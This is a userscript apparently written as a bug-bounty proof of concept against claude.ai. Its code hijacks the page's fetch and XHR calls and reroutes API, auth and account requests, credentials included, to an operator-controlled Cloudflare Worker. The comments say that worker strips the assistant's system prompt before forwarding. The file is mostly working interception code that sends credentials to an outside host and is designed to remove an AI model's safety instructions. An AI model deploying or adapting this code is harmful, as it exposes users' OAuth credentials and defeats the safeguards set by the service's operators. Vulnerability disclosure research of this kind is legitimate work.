// ==UserScript==
// @name         Sister PoC — Tampermonkey (CF Workers Edition v2)
// @namespace    sister-poc-vdp-anthropic
// @version      2.1.0
// @description  Routes claude.ai / Worker B API fetch calls through CF Worker C.
//               Worker C strips system prompts and forwards (passthrough or mock).
//               Operator-only. VDP research artifact for Anthropic HackerOne.
// @author       Operator
// @match        https://claude.ai/*
// @match        https://*.anthropic.com/*
// @match        https://*.workers.dev/*
// @match        http://127.0.0.1:*/*
// @match        http://localhost:*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// ================================================================
// CONFIGURE — paste your Worker C URL here before installing
// ================================================================
const WORKER_C_URL = 'https://CHANGE-ME.workers.dev'; // ← your Worker C

// ================================================================
// WHAT THIS DOES (for VDP submission context):
//
// Demonstrates the same fetch-hijack pattern as CoCoDem request.js
// but targeting claude.ai's web surface rather than the extension.
//
// Real VDP demo mode (FORWARD_URL=passthrough on Worker C):
//   claude.ai page makes fetch to api.anthropic.com/v1/messages
//   → this script intercepts it
//   → routes to Worker C with x-original-url: api.anthropic.com/...
//   → Worker C strips system prompt, forwards to api.anthropic.com
//   → your real OAuth credentials are forwarded unchanged
//   → response comes back with x-wc-system-stripped: true header
//
// Testing mode (FORWARD_URL=worker-a-url on Worker C):
//   Same flow but Worker C forwards to Worker A mock backend.
//   No real Anthropic contact.
//
// Key architectural finding: fetch trust at page-context level.
// A page-context script (userscript/injected JS) has the same
// network access as the page itself — including its credentials.
// ================================================================

(function () {
  'use strict';

  if (!WORKER_C_URL || WORKER_C_URL.includes('CHANGE-ME')) {
    console.warn('[Sister PoC TM v2] Set WORKER_C_URL in the script header before running.');
    return;
  }

  const VERSION   = '2.1.0';
  const CLIENT_ID = 'tm-' + Math.random().toString(36).slice(2, 8);

  // ── API paths to intercept ────────────────────────────────────
  // These are paths that carry system prompts / completion requests
  const INTERCEPT_PATHS = [
    '/v1/messages',
    '/v1/completions',
    '/api/organizations/',      // includes completion sub-paths
    '/api/account',
    '/api/bootstrap',
    '/auth/',
    '/health',
    '/bridge/',
  ];

  // ── Domains whose traffic we intercept ───────────────────────
  // api.anthropic.com = real API calls from claude.ai
  // workers.dev / localhost = testing against Worker B
  const INTERCEPT_DOMAINS = [
    'api.anthropic.com',
    'claude.ai',
    'workers.dev',
    '127.0.0.1',
    'localhost',
  ];

  // ── Telemetry — log but DON'T intercept ──────────────────────
  const TELEMETRY_DOMAINS = [
    'segment.com', 'statsig', 'sentry.io', 'honeycomb.io',
    'datadoghq.com', 'prodregistryv2.org',
  ];

  // Save originals at document-start before any page script runs
  const _origFetch   = window.fetch   ? window.fetch.bind(window)   : null;
  const _origXHROpen = XMLHttpRequest.prototype.open;

  let interceptCount = 0;

  // ── shouldIntercept ───────────────────────────────────────────
  function shouldIntercept(urlStr) {
    let u;
    try { u = new URL(urlStr, window.location.href); }
    catch { return false; }

    const host = u.hostname.toLowerCase();

    // Check domain
    const domainMatch = INTERCEPT_DOMAINS.some(d =>
      host === d || host.endsWith('.' + d)
    );
    if (!domainMatch) return false;

    // Never route Worker C itself (avoid loops)
    if (u.href.startsWith(WORKER_C_URL)) return false;

    // Check path
    return INTERCEPT_PATHS.some(p => u.pathname.startsWith(p));
  }

  // ── Route through Worker C ────────────────────────────────────
  async function routeViaWorkerC(input, init = {}) {
    const originalUrl = (
      typeof input === 'string'       ? input :
      input instanceof URL            ? input.toString() :
      input instanceof Request        ? input.url :
      String(input)
    );

    const parsed = new URL(originalUrl, window.location.href);
    // Build Worker C URL preserving path + query
    const workerCTarget = WORKER_C_URL.replace(/\/$/, '') +
                          parsed.pathname +
                          parsed.search;

    // Collect original request headers
    const originalHeaders = new Headers(
      init?.headers ??
      (input instanceof Request ? input.headers : {})
    );

    // Build forwarding headers
    const fwdHeaders = new Headers(originalHeaders);
    fwdHeaders.set('x-original-url', originalUrl);       // tells Worker C where to forward
    fwdHeaders.set('x-tm-client-id', CLIENT_ID);
    fwdHeaders.set('x-tm-version',   VERSION);

    const method = (
      init?.method ??
      (input instanceof Request ? input.method : 'GET')
    ).toUpperCase();

    let body = init?.body ?? (input instanceof Request ? input.body : undefined);

    interceptCount++;
    console.debug(`[Sister PoC TM v2] → ${method} ${originalUrl}`);
    console.debug(`[Sister PoC TM v2]   via Worker C: ${workerCTarget}`);

    const resp = await _origFetch(workerCTarget, {
      method,
      headers: fwdHeaders,
      body:    (method === 'GET' || method === 'HEAD') ? undefined : body,
    });

    // Surface evidence in DevTools
    if (resp.headers.get('x-wc-system-stripped') === 'true') {
      const len = resp.headers.get('x-wc-system-length') || '?';
      console.info(`[Sister PoC TM v2] ✂ System prompt stripped by Worker C (${len} chars)`);
      console.info(`[Sister PoC TM v2]   VDP evidence: x-wc-system-stripped: true`);
    }

    return resp;
  }

  // ── fetch override ────────────────────────────────────────────
  if (_origFetch) {
    window.fetch = async function sisterPocFetch(input, init = {}) {
      const urlStr = (
        typeof input === 'string'       ? input :
        input instanceof URL            ? input.toString() :
        input instanceof Request        ? input.url :
        String(input)
      );

      // Telemetry: log and pass through unchanged
      if (TELEMETRY_DOMAINS.some(d => urlStr.includes(d))) {
        console.debug('[Sister PoC TM v2] telemetry pass-through:', urlStr);
        return _origFetch(input, init);
      }

      if (!shouldIntercept(urlStr)) {
        return _origFetch(input, init);
      }

      try {
        return await routeViaWorkerC(input, init);
      } catch (e) {
        console.warn('[Sister PoC TM v2] Route failed, falling through:', e.message);
        return _origFetch(input, init);
      }
    };
  }

  // ── XHR override ─────────────────────────────────────────────
  XMLHttpRequest.prototype.open = function sisterPocXHR(method, url, ...rest) {
    let target = url;
    try {
      if (shouldIntercept(String(url))) {
        const parsed = new URL(String(url), window.location.href);
        target = WORKER_C_URL.replace(/\/$/, '') + parsed.pathname + parsed.search;
        // Store original URL for the send phase via custom property
        this.__originalUrl = String(url);
        interceptCount++;
        console.debug(`[Sister PoC TM v2] XHR rewrite: ${method} ${url} → ${target}`);
      }
    } catch { /* pass through */ }
    return _origXHROpen.apply(this, [method, target, ...rest]);
  };

  // ── Stats for debugging ───────────────────────────────────────
  window.__sisterPocTM = {
    version:         VERSION,
    clientId:        CLIENT_ID,
    workerCUrl:      WORKER_C_URL,
    interceptCount:  () => interceptCount,
    interceptPaths:  INTERCEPT_PATHS,
    interceptDomains: INTERCEPT_DOMAINS,
    shouldIntercept,
  };

  console.log(
    `[Sister PoC TM v2 | ${VERSION}] Ready`,
    '\n  clientId:', CLIENT_ID,
    '\n  Worker C:', WORKER_C_URL,
    '\n  Intercept domains:', INTERCEPT_DOMAINS.join(', '),
    '\n  Paths:', INTERCEPT_PATHS.length,
  );

})();
